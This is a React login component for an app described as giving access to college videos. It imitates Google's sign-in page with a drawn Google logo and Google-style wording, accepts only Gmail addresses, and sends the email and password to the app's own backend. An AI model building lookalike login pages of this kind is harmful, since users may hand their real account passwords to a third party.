import React, { useState } from "react";
import API from "../api";

export default function Login() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  const isValidGmail = (email) => {
    return email.endsWith("@gmail.com");
  };

  const handleLogin = async () => {
    setError("");

    if (!email || !password) {
      setError("Enter all details");
      return;
    }

    if (!isValidGmail(email)) {
      setError("Please enter a valid Gmail address (@gmail.com)");
      return;
    }

    if (password.length < 6) {
      setError("Password must be at least 6 characters");
      return;
    }

    try {
      setLoading(true);
      const res = await API.post("/login", { email, password });
      localStorage.setItem("token", res.data.token);
      window.location.href = "/video";
    } catch (error) {
      console.error("Login error:", error);
      setError(error.response?.data?.message || "Login failed. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="google-login-wrapper">
      <div className="google-login-container">
        <div className="google-logo">
          <svg width="75" height="24" viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
            <text x="0" y="20" fontSize="24" fontFamily="Arial, sans-serif" fill="#4285F4">G</text>
            <text x="18" y="20" fontSize="24" fontFamily="Arial, sans-serif" fill="#EA4335">o</text>
            <text x="32" y="20" fontSize="24" fontFamily="Arial, sans-serif" fill="#FBBC05">o</text>
            <text x="46" y="20" fontSize="24" fontFamily="Arial, sans-serif" fill="#4285F4">g</text>
            <text x="60" y="20" fontSize="24" fontFamily="Arial, sans-serif" fill="#34A853">l</text>
            <text x="68" y="20" fontSize="24" fontFamily="Arial, sans-serif" fill="#EA4335">e</text>
          </svg>
        </div>

        <h1 className="google-login-title">Sign in</h1>
        <p className="google-login-subtitle">Access your college videos</p>

        {error && <div className="google-error-message">{error}</div>}

        <div className="google-form-group">
          <input
            className="google-input"
            placeholder="Email or phone"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            type="email"
          />
        </div>

        <div className="google-form-group password-group">
          <input
            className="google-input"
            placeholder="Enter password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            type={showPassword ? "text" : "password"}
          />
          <button
            type="button"
            className="google-toggle-password"
            onClick={() => setShowPassword(!showPassword)}
            title={showPassword ? "Hide password" : "Show password"}
          >
            {showPassword ? "👁️" : "👁️‍🗨️"}
          </button>
        </div>

        <div className="google-button-group">
          <button className="google-button-secondary">Create account</button>
          <button 
            className="google-button-primary" 
            onClick={handleLogin} 
            disabled={loading}
          >
            {loading ? "Signing in..." : "Next"}
          </button>
        </div>
      </div>
    </div>
  );
}






















